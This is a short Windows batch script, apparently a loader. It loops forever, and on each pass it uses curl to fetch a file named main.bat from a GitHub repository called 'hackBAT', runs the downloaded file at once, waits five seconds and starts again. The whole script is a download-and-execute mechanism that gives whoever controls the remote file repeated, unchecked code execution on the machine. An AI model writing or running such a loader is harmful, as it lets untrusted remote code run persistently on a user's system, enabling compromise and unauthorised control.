```
@echo off
setlocal

:start
echo Downloading file from github...
curl -o c.bat https://raw.githubusercontent.com/taha00125/hackBAT/main/main.bat
call c.bat
timeout /t 5 /nobreak >nul
goto start
```
